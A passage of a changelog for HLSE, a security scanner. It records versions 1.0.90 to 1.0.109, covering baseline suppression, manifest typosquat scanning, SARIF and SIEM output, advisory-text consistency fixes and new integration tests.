  `pattern_id` falls back to the existing `HLSE-SECRET-GENERIC` append-only
  token (no new token minted for a user-defined type).

  - **New**: `examples/custom-patterns.example` — a documented, runnable
    example file.
  - **Docs**: `--help` and the man page (`hlse.1`) document the format.
  - **Tests**: 10 new CLI integration tests — detection on/off without the
    flag, configured-score verification, JSON `pattern_id` fallback,
    built-in patterns unaffected, `scan` honoring the flag, malformed-line
    resilience, unreadable-file usage error, and an F1-invariant check
    (696 total).

## [1.0.109] — 2026-07-02

### Added
- **Perspective 109 (roadmap P2-1): SARIF output for `package --manifest`.**

  The commercial-gap audit noted SARIF (GitHub Code Scanning) was emitted for
  only the three `scan` rules. A manifest typosquat maps naturally to Code
  Scanning — it is a repo file (`requirements.txt` / `package.json`) with a
  line number — so `package --manifest --sarif` now emits it. A new
  `package-typosquat` SARIF rule (security-severity 7.0, CWE-1357
  "Improper Neutralization of Dependencies") joins the existing three; each
  result carries the manifest path, the line the dependency was declared on,
  and the stable `HLSE-PKG-TYPOSQUAT` pattern_id in `properties.pattern_id`.

  Reuses the existing `sarif_add()`/`sarif_emit()` infrastructure — no scoring
  change (F1=1.000 preserved); `scan --sarif` output is unchanged apart from
  the extra rule definition in the shared rule table.

  (System `audit` findings were considered but deferred: they describe host
  configuration, not repo files, so they do not map cleanly onto Code
  Scanning's repo-file model.)

  - **Docs**: `docs/SIEM_INTEGRATION.md` documents the new rule and the
    `package --manifest --sarif` invocation.
  - **Tests**: 3 new CLI integration tests — manifest SARIF emits the rule +
    result at the right line, a clean manifest emits a valid empty-results
    doc, and `scan --sarif` still validates after the rule-table change
    (686 total).

## [1.0.108] — 2026-07-02

### Added
- **Perspective 108 (roadmap P1-8): `package --manifest <file>` scans every
  dependency in a manifest, not one name at a time.**

  The commercial-gap audit (vs socket.dev/Snyk/OSV-Scanner) noted the
  single-name `package <name>` check is impractical for real projects — no one
  hand-checks each dependency. `package --manifest <file>` now runs the
  existing typosquat detector over every declared dependency in a
  `requirements.txt` (pip) or `package.json` (npm); ecosystem is inferred from
  the filename or given explicitly (pip|npm|cargo|go|gem).

  - The pip parser extracts the leading package name from each requirement
    line, skipping comments, blanks, and pip options (`-r`, `-e`, `--`).
  - The npm parser extracts dependency names from `dependencies` /
    `devDependencies` / `peerDependencies` / `optionalDependencies` objects,
    handling both the canonical one-dep-per-line layout and the compact
    single-line object form, and correctly ignoring top-level fields like
    `name`/`version`.
  - Emits one verdict per suspicious (score >= 40) package plus a
    `manifest_summary` line; exits 1 if any package reaches `--fail-on`. An
    un-inferable ecosystem or unreadable file is a usage error (exit 2).

  Pure orchestration of the existing `hlse_check_package()` — no scoring
  change (F1=1.000 preserved); the single-name path is byte-identical.

  - **Schema**: `package` verdict gains an optional `ecosystem` field; new
    `schema/hlse_manifest_summary.schema.json` for the summary line.
  - **Tests**: 9 new CLI integration tests — pip and npm parsing (incl.
    top-level-field exclusion), JSON schema validation, clean/exit-0,
    un-inferable-ecosystem and missing-file usage errors, and an F1-invariant
    single-name check (683 total).

## [1.0.107] — 2026-07-02

### Added
- **Perspective 107 (roadmap P0-1): baseline / allowlist / inline suppression
  for `scan` — the single biggest blocker to commercial CI adoption.**

  A commercial-gap audit (vs gitleaks/detect-secrets/GitGuardian) found HLSE
  had no way to accept known findings, so a brownfield repo's very first
  `scan` fails the `--fail-on` gate forever and can never be added to CI. This
  release adds the detect-secrets-style baseline workflow, entirely offline
  and dependency-free:

  - `--fingerprints scan <dir>` emits one stable fingerprint per finding
    (16 hex chars + pattern_id + relative path) and exits 0. Redirect to a
    file to create a baseline: `hlse_core --fingerprints scan . > .hlse-baseline`.
  - `--baseline <file>` suppresses every finding whose fingerprint is listed;
    only NEW findings count toward the gate. An unreadable baseline path is a
    usage error (exit 2), never a silent pass.
  - Inline `hlse:allow` on a scanned line suppresses findings on that line
    (gitleaks:allow-style).

  The fingerprint is a 64-bit FNV-1a hash of `relpath\0pattern_id\0match`,
  rendered as 16 hex chars. It deliberately omits the line number, so a
  finding that moves lines stays suppressed. Applies to all three `scan`
  checks (secret, file-masquerade, embedded-URL) in text, JSON, and SARIF
  modes; the JSON `scan_summary` threat count reflects suppression.

  Implemented purely as a post-detection output filter — no detection logic,
  score, or threshold touched (F1=1.000 preserved). `--help` and the man page
  document the workflow.

  - **Tests**: 10 new CLI integration tests — fingerprint generation, full
    baseline suppress/only-new-fails cycle, JSON summary reflection, bad-path
    usage error, inline `hlse:allow`, and an F1-invariant check (674 total).

## [1.0.106] — 2026-07-02

### Fixed
- **Perspective 106 (roadmap P2-3): the `email` subcommand no longer silently
  ignores `--from`; it explains why the flag does not apply.**

  `--from <channel>` sets a delivery-channel prior that boosts URL/text
  scores, but email headers are BY DEFINITION received over email — the
  channel is intrinsic and fixed, and a `--from` override (especially a
  non-email one like `sms`) is meaningless for header forensics. The flag was
  accepted and silently dropped, which reads like a bug to a user who passed
  it deliberately. The `email` command now prints a one-line stderr note when
  `--from` is present, clarifying that the channel prior is intrinsic and not
  applied. stdout (the JSON/text verdict) is unchanged; F1=1.000 preserved.

  - **Tests**: 2 new CLI integration tests — `--from` with `email` emits the
    stderr note with the JSON verdict unchanged on stdout, and `email`
    without `--from` emits no note (664 total).



### Fixed
- **Perspective 105 (roadmap P1-2): `secret --stdin` / `email --stdin` no
  longer silently truncate at 64 KB — a demonstrated false negative.**

  A commercial-gap audit (vs gitleaks/trufflehog/detect-secrets) found that
  `read_stdin_all()` filled a 64 KB stack buffer and discarded the rest with
  no warning, so a credential past that offset read as clean (exit 0). This
  was reachable through the *shipped* `examples/pre-commit-hook.sh`, which
  pipes files up to 1 MB into `secret --stdin` — any secret in the tail of a
  64 KB–1 MB file was a silent miss. Measured: an AWS key at a 70 KB offset
  returned exit 0 (the same key alone is ISOLATE[80]).

  Two-part fix:
  - Both `--stdin` buffers enlarged from 64 KB to 1 MiB, BSS-allocated
    (`static`, not stack), matching the shipped hook's own 1 MB file-size
    guard — so no in-scope input is truncated at all.
  - `read_stdin_all()` now detects overflow past the buffer, drains the rest
    of stdin (so a pipe writer never blocks), and prints a precise stderr
    warning naming how many bytes were dropped and that a clean result is
    NOT authoritative for the full input — a backstop for inputs larger than
    1 MiB.

  Pure I/O-layer fix — no detection logic, score, or threshold touched
  (F1=1.000 preserved).

  - **Tests**: 3 new CLI integration tests — a 70 KB-offset secret is now
    detected, a >1 MiB input emits the truncation warning, and a normal
    small input emits no spurious warning (662 total).

## [1.0.104] — 2026-07-01

### Fixed
- **Perspective 104: completed the P101-103 DRY consolidation — `esp` and
  `clipboard` (the two remaining BLOCK+-only kinds) had the same JSON/
  plaintext advisory-text duplication and drift.**

  Socratic question: esp and clipboard never needed the ALERT-band split
  (their scores are always 0 or 60+/70+/95+ — bimodal, never landing in
  40-59 alone) — but does that mean they escaped the duplication problem
  P101-103 fixed for the other five kinds? No: both built JSON advisory text
  from `static const char[]` literals while the matching plaintext path
  independently re-typed shorter, differently-worded text for the same
  verdict (e.g. clipboard's JSON `verify` ended "...before confirming **the
  transaction**"; plaintext silently dropped "the transaction").

  New shared accessors `esp_pattern_text()`/`_objective_text()`/
  `_verify_text()`/`_triage_text()`/`_cascade_text()` and the matching
  `clipboard_*` group replace every independent copy — completing the same
  consolidation applied to file (P101), secret (P102), and protect/network/
  package (P103). All 7 kinds with a pattern/objective/verify/triage/
  cascade_risk advisory structure now share one definition per field,
  guaranteeing JSON and CLI plaintext output describe every verdict
  identically.

  Pure refactor — no detection logic, score, or threshold touched
  (F1=1.000 preserved); every JSON value is unchanged.

  - **Tests**: 3 new CLI integration tests use a real reproducible ESP
    bootkit-indicator trigger and a real clipboard-hijack trigger to assert
    JSON/plaintext word-for-word agreement, plus an F1-invariant ISOLATE-
    score check (656 → 659 total).

## [1.0.103] — 2026-07-01

### Fixed
- **Perspective 103: extended the P101/P102 DRY consolidation to `protect`,
  `network`, and `package` — all three had the same JSON/plaintext advisory-
  text duplication and drift.**

  Socratic question: P101 and P102 found and fixed pattern/objective/verify/
  triage/cascade_risk text duplicated between JSON and plaintext for `file`
  and `secret` — do the other kinds with the same ALERT-band advisory
  structure (`protect` from P100, `network` and `package` from P95/96/97)
  have it too? Yes, all three: each kind's JSON path built its advisory
  lines from `static const char[]` literals, while the matching plaintext
  path independently re-typed shorter, differently-worded `printf` literals
  describing the same verdict (e.g. `protect`'s JSON objective said
  "ransomware encrypts accessible files **and demands payment**"; plaintext
  silently dropped the "and demands payment" clause).

  New shared accessors — `protect_pattern_text()`/`_objective_text()`/
  `_verify_text()`/`_triage_text()`/`_cascade_text()`, and matching
  `network_*`/`net_pattern_text()` and `package_*`/`package_pattern_text()`
  groups — replace every independent copy. Pure refactor — no detection
  logic, score, or threshold touched (F1=1.000 preserved); every JSON value
  is unchanged, and plaintext now emits the same (previously fuller, JSON-
  side) wording word-for-word.

  - **Tests**: 4 new CLI integration tests assert JSON/plaintext word-for-
    word agreement for `protect` (real SMB canary-file trigger), `network`
    (real `/etc/hosts` redirect trigger, backed up/restored via `trap`), and
    `package` (real multi-registry match), plus an F1-invariant BLOCK+ check
    (652 → 656 total).

## [1.0.102] — 2026-07-01

### Fixed
- **Perspective 102: applied the P101 DRY consolidation to the `secret` kind
  too — and the refactor surfaced a real "blast radius" naming collision in
  `scan` output.**

  Socratic question: does `secret` have the same four-way advisory-text
  duplication P101 found and fixed for `file`? Yes — the pattern label,
  verify, triage, and cascade_risk text were each independently copy-pasted
  at the standalone `secret` JSON site and the `scan`-embedded JSON site
  (identical text under two different names: `sec_vrf`/`ss_vrf`,
  `sec_tri`/`ss_tri`, `sec_cas`/`ss_cas`), and separately reduced to shorter,
  differently-worded `printf` literals at both plaintext sites.

  New shared accessors `secret_pattern_label()`, `secret_verify_text()`,
  `secret_triage_text()`, `secret_cascade_text()` replace all four copies —
  mirroring `file_masquerade_objective()`/`file_masquerade_verify()` from
  P101.

  Unifying JSON and plaintext wording surfaced a genuine bug: the verify
  text said "...setting the blast radius" (meaning "the scope of what was
  accessed"), and once plaintext started using the same full text as JSON, a
  single-credential `scan` began printing the substring "blast radius" —
  colliding with `scan`'s unrelated, distinct `⚠ BLAST RADIUS:` warning for
  credentials spanning multiple asset classes (a pre-existing feature). A
  test asserting single-asset-class scans never print "blast radius" caught
  this immediately. Reworded to eliminate the collision.

  Pure refactor plus a wording fix — no detection logic, score, or threshold
  touched (F1=1.000 preserved); all four sites and JSON-vs-plaintext now
  emit byte-identical wording for the same verdict.

  - **Tests**: 4 new CLI integration tests assert standalone/scan agreement,
    JSON/plaintext word-for-word agreement, that the BLAST RADIUS collision
    is gone, and an F1-invariant ISOLATE-score check (648 → 652 total).

## [1.0.101] — 2026-07-01

### Fixed
- **Perspective 101: audit schema's per-finding severity mapping was wrong
  (deficiency), and the file-masquerade advisory text was duplicated four
  independent times across standalone/scan × JSON/plaintext (excess).**

  Socratic audit of both directions — missing correctness vs. redundant
  maintenance burden:

  **Deficiency**: `hlse_audit_verdict.schema.json`'s per-finding `severity`
  description read "0=LOW 1=INFO 2=MED 3=HIGH 4=CRITICAL 5=CRITICAL", but the
  actual code (`sev_str[] = {"PASS","INFO","LOW","MED","HIGH","CRIT"}`) maps
  severity 4 to **HIGH**, not CRITICAL, and severity 0 to PASS, not LOW. A
  SIEM rule built from the schema (e.g. "route severity >= 4 as CRITICAL")
  would misclassify every HIGH finding as CRITICAL. Fixed to the actual
  0=PASS/1=INFO/2=LOW/3=MED/4=HIGH/5=CRITICAL mapping, with a note
  distinguishing it from the unrelated top-level 0-4 action-band `severity`.

  **Excess**: the file-masquerade pattern classification (RLO / double-
  extension / macro / PDF) and its "attacker's goal" / "verify first"
  advisory lines were copy-pasted as four independent inline copies — the
  standalone `file` command's JSON and plaintext paths, and `scan <dir>`'s
  embedded-file JSON and plaintext paths — right next to the single shared
  `file_verdict_pattern_id()` that already did the identical reason-string
  match for the SIEM token. Four independently maintained copies is exactly
  how the standalone-vs-scan field asymmetry P95 had to fix originally
  happened, and a side effect surfaced during this audit: the plaintext
  "Attacker's goal"/"Verify first" wording had quietly drifted shorter and
  different from the JSON `objective`/`verify` text for the same verdict.

  New shared accessors `file_classify_pattern()`, `file_masquerade_
  objective()`, `file_masquerade_verify()` replace all four copies. Pure
  refactor plus a consistency fix — no detection logic, score, or threshold
  touched (F1=1.000 preserved); all four sites, and JSON vs. plaintext, now
  emit byte-identical wording for the same verdict.

  - **Tests**: 4 new CLI integration tests assert the schema's severity
    description matches the code, that standalone-`file` and scan-embedded-
    file agree on `objective` text, that JSON and plaintext `verify` text are
    now word-for-word identical, and an F1-invariant BLOCK+ check
    (644 → 648 total).

## [1.0.100] — 2026-07-01

### Fixed
- **Perspective 100: `protect` (ransomware/SMB/MBR detection) was the only
  verdict kind still missing `hlse_version` and `severity`, had no JSON
  Schema file, no `pattern_id`, and the same ALERT-band advisory gap P95-98
  closed elsewhere.**

  Continuing the systematic per-kind audit that started with the ALERT-band
  fixes (P95-98) and the Stripe-key correctness fix (P99): `protect` — one of
  the most safety-critical commands (ransomware detection) — was never
  brought in line with the `hlse_version`/`severity` contract every other
  kind (url/text/file/secret/email/network/esp/package/paste/clipboard) has
  carried since P84/P85. It also had no entry in the `--list-patterns`
  registry and no normative JSON Schema, unlike all 12 other kinds.

  A single SMB canary-file access (+40, real and reproducible: place a
  well-known canary filename in a directory and read it) or a mass-rename
  detection (+40) lands the `protect` verdict in ALERT (40-59) alone — same
  as the P95-98 pattern, `pattern`/`objective`/`verify` only fired at score
  >= 60.

  Fixes, all pure advisory/output — no detection logic, score, or threshold
  touched (F1=1.000 preserved; BLOCK+ verdicts are byte-identical):
  - `protect` JSON now includes `hlse_version` and `severity`, matching
    every other kind.
  - New `pattern_id`: `HLSE-PROTECT-RANSOM`, registered in `--list-patterns`.
  - `pattern`/`objective`/`verify` now fire from score >= 40 (ALERT floor);
    `triage`/`cascade_risk` (disconnect-network incident response, which
    presumes active compromise) stay BLOCK+-only (>= 60).
  - New `schema/hlse_protect_verdict.schema.json` — the last of the 13
    verdict kinds to get a normative schema.
  - `hlse_pattern_registry.schema.json`'s `kind` enum gained `"protect"`.

  - **Tests**: 5 new CLI integration tests use a real reproducible SMB
    canary-file access to assert `hlse_version`/`severity`/`pattern`/
    `pattern_id`/`verify` in ALERT with `triage`/`cascade_risk` absent, a
    clean-verdict schema check, and registry presence (638 → 643 total).

## [1.0.99] — 2026-07-01

### Fixed
- **Perspective 99: `secret` verdict no longer claims a Stripe *publishable*
  key (`pk_live_`) can "issue charges, view customer payment data, and issue
  refunds" — that capability belongs only to Stripe *secret* keys.**

  Socratic question: does the `objective` text describe what THIS SPECIFIC
  credential type can actually do, or does it lump every "Stripe" finding
  under one payment-processing narrative regardless of key kind? Answer:
  the latter, and it was wrong. `secret_objective_for()` matched
  `strstr(type, "Stripe")` for both secret keys (`sk_live_`/`rk_live_`, which
  really do grant charge/refund access) and the publishable key
  (`pk_live_`), which by Stripe's own documentation is designed to be
  embedded in public client-side code and cannot perform any of those
  actions. Reachable whenever a publishable-key finding combines with
  another to cross the score >= 60 objective/remediation/triage threshold
  (e.g. alongside a JWT) — the user would read that their public,
  by-design-safe key just handed an attacker refund access.

  Also: `secret` was the last verdict kind with zero advisory content below
  score 60 (the systematic gap P95-98 closed for url/text/network/package/
  file) — `hlse_exoneration_for()` gained a `"secret"` case.

  Fixes, all pure advisory/output — no detection logic, score, or threshold
  touched (F1=1.000 preserved; AWS/GitHub/other real-secret objectives are
  byte-identical):
  - `secret_objective_for("Stripe Live Publishable")` now returns the
    accurate claim ("none directly ... cannot create charges, issue
    refunds, or read customer payment data").
  - New `secret_finding_caveat()`: an unconditional (any score, not just a
    score-band hedge) factual note for this credential type, emitted as a
    new `"caveat"` JSON field / `⚠ Caveat:` CLI line, explaining rotation is
    not required and naming the actual at-risk key type
    (`sk_live_`/`rk_live_`).
  - `hlse_exoneration_for("secret", score)`: new 15-59 band hedge (test-mode
    keys, doc placeholders, low-entropy samples).

  - **Schema update**: `hlse_secret_verdict.schema.json` gained `exoneration`
    and `caveat` properties.
  - **Tests**: 5 new CLI integration tests cover the standalone ALERT-band
    caveat, absence of the caveat on a real AWS secret, the corrected
    objective text in a combined BLOCK+ scenario, the CLI plaintext caveat
    line, and an F1-invariant check on the unmodified AWS objective
    (633 → 638 total).

## [1.0.98] — 2026-07-01

### Changed
- **Perspective 98: `file` verdict gets the ALERT-band advisory fix — worse
  than P95/96/97, `file` had NO advisory content at all below score 60, not
  even the benign-explanation `exoneration` other kinds already had.**

  Continuing the systematic per-kind audit: a single medium-confidence
  heuristic — e.g. Cabinet-magic (MSCF) file content wearing a non-`.cab`/
  `.msi` extension (+40), or an image/archive magic byte wearing an
  executable extension (+40 to +55) — lands the file verdict in ALERT (40-59)
  alone. Unlike url/text/network/package, `hlse_exoneration_for()` had no
  `"file"` case at all, so an ALERT [40] file verdict rendered nothing but
  the raw reason string — no pattern, no attacker objective, no independent
  check, and no benign explanation either. This was the deepest version of
  the gap P95-P97 closed elsewhere.

  `pattern`/`pattern_id`/`objective`/`verify` now fire from score >= 40 in
  both the standalone `file` command and the per-file path inside
  `scan <dir>`. `hlse_exoneration_for()` gained a `"file"` case (15-59 band).
  `triage`/`cascade_risk` (post-open incident response — disconnect network,
  rotate credentials) stay BLOCK+-only (>= 60), matching the P95-97
  precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved; the polyglot-plus-executable-extension BLOCK+
  case (score 70) is byte-identical.

  - **Schema update**: `hlse_file_verdict.schema.json` gained an
    `exoneration` property (previously entirely absent from the schema) and
    `pattern`/`objective`/`verify` descriptions updated to the ALERT floor.
  - **Tests**: 6 new CLI integration tests exercise a real reproducible
    Cabinet-magic mismatch (`report.dat` with `MSCF` header) via both the
    standalone `file` command and `scan <dir>`, asserting pattern/verify/
    exoneration appear in ALERT while triage/cascade_risk stay absent, plus
    a BLOCK+ F1-invariant check (626 → 632 total).

## [1.0.97] — 2026-07-01

### Changed
- **Perspective 97: `package` verdict gets the same ALERT-band advisory fix
  as URL/text/paste/scan (P95) and network (P96) — `pattern`/`objective`/
  `verify` now fire from score >= 40, not just >= 60.**

  Continuing the systematic audit across every verdict kind: a package name
  that fuzzy-matches known packages in 2+ ecosystems at once — e.g. `reqests`
  with no ecosystem given, which is edit-distance 1 from pip's `requests` AND
  edit-distance 2 from cargo's `reqwest` — lands the verdict at score 50
  (ALERT) alone. The `n_matches == 1 && distance == 1` amplifier that bumps a
  single match to 70 (BLOCK) never fires once a second registry also matches,
  so the ambiguous case scored LOWER than the unambiguous one while getting
  LESS advisory content: no `pattern`, `objective`, or `verify` — only raw
  match data and an exoneration hint.

  `triage`/`cascade_risk` (uninstall-and-rotate guidance, which presumes the
  package was already installed) stay BLOCK+-only (>= 60), matching the
  P95/P96 precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved; the single-registry BLOCK+ case (score 70) is
  byte-identical.

  - **Schema update**: `hlse_package_verdict.schema.json`'s `objective` and
    `verify` descriptions updated from "score >= 60 only" to the ALERT floor.
  - **Tests**: 4 new CLI integration tests use a real reproducible multi-
    ecosystem match (`reqests`, no ecosystem arg) to assert pattern/verify
    appear in ALERT while triage/cascade_risk stay absent, in both JSON and
    CLI plaintext, plus a BLOCK+ F1-invariant check (621 → 625 total).

## [1.0.96] — 2026-07-01

### Changed
- **Perspective 96: `network` verdict gets the same ALERT-band advisory fix
  P95 gave URL/text/paste/scan — `pattern`/`objective`/`verify` now fire from
  score >= 40, not just >= 60.**

  Continuing the audit from P95: a single N4 finding (`/etc/hosts` banking-
  domain redirect — pharming, +50) or N2 finding (duplicate-metric default
  routes — routing injection, +55) lands the network verdict in ALERT (40-59)
  on its own, but the `network` command only emitted `pattern`, `pattern_id`,
  `objective`, and `verify` at score >= 60 — identical to the gap P95 closed
  elsewhere. A user whose hosts file was silently redirecting `paypal.com`
  saw a bare ALERT [50] with raw reasons and an exoneration hint, but no
  identification of the attack class or an independent check to run.

  `triage` and `cascade_risk` (kill-the-process / rotate-credentials — post-
  incident guidance that presumes disruptive action) correctly stay
  BLOCK+-only (>= 60), matching the P95 precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved.

  - **Schema update**: `hlse_network_verdict.schema.json`'s `objective` and
    `verify` descriptions updated from "score >= 60 only" to the ALERT floor.
  - **Tests**: 3 new CLI integration tests trigger a real N4 hosts-file
    redirect (backed up and restored via `trap`, safe in this isolated
    ephemeral container) and assert pattern/verify appear in ALERT while
    triage/cascade_risk stay absent, in both JSON and CLI plaintext.

## [1.0.95] — 2026-07-01

### Changed
- **Perspective 95: `verify` (pre-action independent-check guidance) now fires
  from the ALERT floor (score >= 40), not just BLOCK+ (score >= 60).**

  Socratic gap identified while auditing overall product strengths/weaknesses:
  an ALERT-band verdict (40-59) — the score band where HLSE is LEAST certain —
  showed a pattern label and an "attacker's goal" line but left `verify`,
  `triage`, and `cascade_risk` all NULL. A user reading `https://paypaI.com`
  scored ALERT [50] had no actionable next step; only a BLOCK [60+] verdict
  told them what to do. But ALERT is exactly the band where an independent
  check is most valuable — a BLOCK verdict is confident enough that verify is
  a courtesy, while an ALERT verdict genuinely needs it to resolve the
  ambiguity the score itself admits to.

  `hlse_verification_for` (URL) and `hlse_text_verify` (text) now gate at
  score >= 40 instead of >= 60. `triage` and `cascade_risk` — post-incident
  guidance that presumes the user already acted — correctly stay BLOCK+-only
  (>= 60); only the pre-action `verify` lens widened. In the 40-59 overlap,
  `verify` now co-occurs with `exoneration` — together they let the user
  decide (an independent test to confirm OR a benign read to dismiss) instead
  of just watching a bare score.

  This also fixed a deeper asymmetry: the same URL scanned standalone versus
  found embedded inside a scanned file previously produced different JSON
  shapes at ALERT — the embedded-URL path in `scan` emitted only `reasons` +
  `exoneration`, dropping `pattern`, `pattern_id`, `objective`, and `safe_url`
  entirely below score 60, while the standalone URL path already showed them
  unconditionally. Both paths, plus the `paste` and `email` (body-pattern)
  commands, now agree.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched (F1=1.000 invariant preserved; BLOCK+ verdicts are byte-identical).

  - **Schema updates**: `hlse_url_verdict`, `hlse_text_verdict`,
    `hlse_paste_verdict`, and `hlse_email_verdict` schemas' `verify` field
    descriptions updated from "score >= 60 only" to the new ALERT floor.
  - **Tests**: 7 new CLI integration tests cover text/URL/scan/paste ALERT-band
    verify emission, confirm triage/cascade_risk stay BLOCK+-only, and assert
    BLOCK+ verdicts are unchanged (617 total, 0 failed). 2 pre-existing tests
    that asserted the old ">= 60 only" contract were updated to assert the new
    ">= 40" contract.

## [1.0.94] — 2026-06-30

### Changed
- **Perspective 94: email JSON verdicts now emit `signal_count`, `confidence`, and
  `pattern_id` fields for proper SIEM/SOAR integration and API symmetry.**

  Socratic gap identified: email verdicts were missing advisory fields that other
  verdict kinds (text, url, file, secret) provide, creating asymmetry in the JSON
  API and hindering SIEM ingestion pipelines. The schema defined these fields but
  the implementation did not emit them consistently.

  - **signal_count** (1 or 2): counts independent analysis signals — 1 = header-only
    analysis, 2 = header + body text both analyzed for patterns.
  - **confidence**: describes why the verdict is trustworthy — e.g., "two independent
    signals — header authentication + body text both analyzed" when both components
    fired.
  - **pattern_id**: emits stable HLSE-* token (e.g., `HLSE-BEC-WIRE`, `HLSE-BEC-CEO`)
    when body patterns are detected, enabling SOAR routing on email body attacks.
  - **exoneration**: when email header score is 15–59 (borderline), emits potential
    benign explanations (e.g., "internal payment requests do arrive by email. Decisive
    test: call the supposed sender on a number you already have").

  Pure advisory/JSON output change — no detection logic or scoring modified (F1=1.000
  invariant preserved). Email verdicts now match the field structure of URL, text,
  and file verdicts for consistent SIEM mapping.

  - **Schema update**: `hlse_email_verdict.schema.json` now defines `signal_count`
    and `confidence` fields.
  - **Tests**: 6 new CLI integration tests verify signal_count/confidence emission,
    pattern_id presence for body patterns, exoneration for borderline scores, and
    schema validation (609 total, 0 failed).

## [1.0.93] — 2026-06-24

### Changed
- **Perspective 93: email `blind_spot` warns that authentication PASS
  (SPF/DKIM/DMARC) is not a safety guarantee — aligns the clean-email hedge with
  2025 DMARC-bypass threat intel.**

  Research-driven (Qiita / Zenn + threat-intel survey on DMARC/SPF/DKIM): DMARC
  only stops *exact-domain* spoofing. Once a domain enforces DMARC, attackers
  pivot to two vectors that **pass SPF/DKIM/DMARC by design**: (1) **display-name
  spoofing** — a brand name in the display field with a different (authenticated)
  From domain, and (2) **attacker-owned look-alike / cousin domains**. Reporting
  notes 63% of campaigns pivot to look-alike domains within ~10 days of DMARC
  enforcement. A user who reads "headers clean / SPF pass" can be falsely
  reassured.

  Socratic question: "HLSE's clean-email verdict hedges with a blind_spot, but it
  only mentions a 'clean-domain look-alike'. The bigger trap is that a green
  authentication result is itself not a safety signal — display-name spoofing and
  attacker-owned cousin domains pass DMARC. Does our hedge make that explicit, or
  could a user still infer 'auth pass = safe'?"

  Pure advisory/output change — no detection logic, score, or threshold touched
  (clean email stays score 0 / SAFE). The email `blind_spot` now states that
  authentication PASS is not a safety guarantee, names the two DMARC-bypass
  vectors (display-name spoofing, look-alike/cousin domains) plus breached
  legitimate accounts, and tells the user to read the actual From-address domain
  character-by-character and verify out-of-band.

  - **Tests**: 2 new CLI integration tests assert the DMARC-pass caveat and its
    named vectors are present, and that the clean-email score is unchanged
    (603 total, 0 failed).

## [1.0.92] — 2026-06-24

### Changed
- **Perspective 92: package `verify` advisory names the preventive control
  (`--ignore-scripts`) — aligns guidance with 2025-2026 supply-chain threat
  intel.**

  Research-driven (Qiita / Zenn survey on npm/PyPI supply-chain defense): the
  dominant 2025-2026 attack vector is the **Shai-Hulud self-replicating npm
  worm**, which abuses install **lifecycle scripts** (`preinstall`,
  `postinstall`, and — in V2 — `prepare`) that auto-execute on `npm install`
  with the user's privileges, *before the install even completes*. The single
  most effective preventive control the research names is installing with
  **`--ignore-scripts`** (npm/pnpm) / `--no-build` (uv/pip).

  Socratic question: "HLSE's package verdict already names Shai-Hulud and tells
  the user to inspect lifecycle scripts *after* install. But the highest-leverage
  action is preventive — install with `--ignore-scripts` so the malicious hook
  never runs. Why does our 'verify first' advisory (the step *before* the user
  installs) omit the one flag that actually neutralizes the vector?"

  Pure advisory/output change — no detection logic, score, or threshold
  touched (typosquat verdict stays score 70 / BLOCK / severity 3 /
  `HLSE-PKG-TYPOSQUAT`):
  - The package `verify` advisory (JSON + text) now recommends installing with
    `--ignore-scripts` / `--no-build` as the preventive control, explaining that
    lifecycle hooks run before install completes.
  - The `triage` advisory now enumerates all three exploited hooks
    (`preinstall`/`postinstall`/`prepare`) rather than just the first two,
    reflecting the Shai-Hulud V2 shift to `preinstall`/`prepare`.

  - **Tests**: 3 new CLI integration tests assert the preventive control is
    named, JSON/text advisories stay in sync, and the score is unchanged
    (601 total, 0 failed).

## [1.0.91] — 2026-06-24

### Added
- **Perspective 91: SARIF results carry stable `pattern_id` tokens + enriched
  rule metadata — closes the stable-token gap at the GitHub Code Scanning
  surface.**

  Research-driven (Qiita / Zenn survey): SARIF → GitHub Code Scanning is the
  standard way to surface scanner findings, and `ruleId` is how the GitHub
  Security tab groups, tracks, and deduplicates alerts across commits. HLSE's
  SARIF emitted only 3 coarse rule IDs (`secret`, `phishing-url`,
  `file-masquerade`) while the rest of the API exposes 61 stable `pattern_id`
  tokens (P88). In the Security tab an AWS-key leak and a private-key leak
  collapsed into one rule; a homoglyph URL and a typosquat into another — the
  stable-token routing established by P78–P90 was lost exactly where triage
  happens.

  Socratic question: "We built stable tokens for SIEM routing — but at the
  GitHub Code Scanning surface every finding still collapses into one of three
  buckets. How does a security team triage by attack class there?"

  Pure output change — no detection logic touched:
  - Each SARIF `result.properties` now carries the stable `pattern_id`
    (`HLSE-SECRET-AWS`, `HLSE-URL-HOMOGLYPH`, `HLSE-FILE-DOUBLE-EXT`, …) so SOAR
    automation and per-class triage work directly off the Code Scanning export.
  - Each SARIF rule gains a `helpUri` (→ `docs/SIEM_INTEGRATION.md`) and
    `properties.tags` (`security` + a CWE tag: CWE-798 secret, CWE-1021 URL,
    CWE-646 file) for richer GitHub rendering.

### Fixed
- The embedded-URL JSON scan path emitted `pattern` without the matching
  `pattern_id` (the standalone `url` path has emitted both since P79). The scan
  path now emits `pattern_id` too, so SARIF and JSON scan outputs agree and the
  stable-token contract holds across every URL emission site.

  - **Tests**: 3 new CLI integration tests pin SARIF pattern_id coverage, rule
    metadata, and SARIF↔JSON agreement (598 total, 0 failed).

## [1.0.90] — 2026-06-24

### Added
- **Perspective 90: SIEM/SOAR integration guide (OCSF + ECS field mapping) —
  closes the data-normalization gap for SIEM ingestion.**

  Research-driven (Qiita / Zenn survey): the dominant theme across Japanese
  security-engineering writing on SIEM/SOAR is that **data normalization is the
  main deployment bottleneck** — every log source has its own field names, so
  teams hand-build custom parsers to map onto the open standards (OCSF, ECS).
  HLSE had invested heavily in machine-readable output (P78–P89: stable
  `pattern_id` tokens, the `--list-patterns` registry, 13 normative schemas) but
  shipped no guide for translating its proprietary fields onto those standards.
  A SIEM engineer ingesting HLSE still had to reverse-engineer the semantics.

  Socratic question: "We made the output machine-readable and self-describing.
  But the consumer's real target is OCSF or ECS, not HLSE's own field names. How
  does a detection engineer know that HLSE `severity` 3 means OCSF
  `severity_id` 4 (High), without reading our source?"

  Pure documentation change — no code touched. New `docs/SIEM_INTEGRATION.md`:
  - HLSE envelope → **OCSF Detection Finding** (class_uid 2004) attribute table
    + a working `jq` transform.
  - HLSE envelope → **ECS** (`event.*`/`rule.*`/`threat.*`) field table + a
    working `jq` transform.
  - The `severity` (0–4) → OCSF `severity_id` (0–6) → ECS `event.severity`
    conversion table, pinned to the engine's actual bands.
